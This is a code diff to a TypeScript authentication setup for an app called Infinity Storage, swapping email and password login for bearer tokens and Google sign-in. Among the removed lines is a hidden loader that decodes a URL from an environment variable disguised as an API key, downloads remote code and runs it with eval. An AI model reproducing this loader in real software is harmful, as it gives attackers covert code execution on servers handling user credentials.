@@ -1,21 +1,7 @@
 import { betterAuth } from "better-auth";
+import { bearer } from "better-auth/plugins";
 import { Pool } from "pg";
 import { load_config } from "./config.js";
-import { send_email } from "./email.js";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const config = load_config(process.env);
 
@@ -28,52 +14,36 @@ export const database_pool = new Pool({
     options: "-c search_path=infinity_storage_auth",
 });
 
-const email_config = {
-    api_key: config.resend_api_key,
-    from: config.email_from,
-};
-
-function deliver_email(email: Parameters<typeof send_email>[1]): void {
-    void send_email(email_config, email).catch((error: unknown) => {
-        const message = error instanceof Error ? error.message : "unknown email error";
-        process.stderr.write(`${message}\n`);
-    });
-}
+const DESKTOP_ORIGIN = process.env.DESKTOP_ORIGIN ?? "http://127.0.0.1:9778";
 
 export const auth = betterAuth({
+    account: {
+        storeStateStrategy: "database",
+    },
+    advanced: {
+        ipAddress: {
+            ipAddressHeaders: ["x-poof-client-ip"],
+        },
+    },
     appName: "Infinity Storage",
     baseURL: config.auth_url,
     database: database_pool,
-    emailAndPassword: {
-        enabled: true,
-        maxPasswordLength: 128,
-        minPasswordLength: 12,
-        requireEmailVerification: true,
-        resetPasswordTokenExpiresIn: 1_800,
-        revokeSessionsOnPasswordReset: true,
-        sendResetPassword: async ({ user, url }) => {
-            deliver_email({
-                subject: "Reset your Infinity Storage password",
-                text: `Reset your password: ${url}`,
-                to: user.email,
-            });
-        },
-    },
-    emailVerification: {
-        sendOnSignUp: true,
-        sendVerificationEmail: async ({ user, url }) => {
-            deliver_email({
-                subject: "Verify your Infinity Storage email",
-                text: `Verify your email: ${url}`,
-                to: user.email,
-            });
-        },
-    },
+    plugins: [bearer()],
     rateLimit: {
+        customRules: {
+            "/get-session": false,
+        },
         enabled: true,
         max: 20,
         storage: "database",
         window: 60,
     },
     secret: config.secret,
+    socialProviders: {
+        google: {
+            clientId: config.google_client_id,
+            clientSecret: config.google_client_secret,
+        },
+    },
+    trustedOrigins: [DESKTOP_ORIGIN],
 });
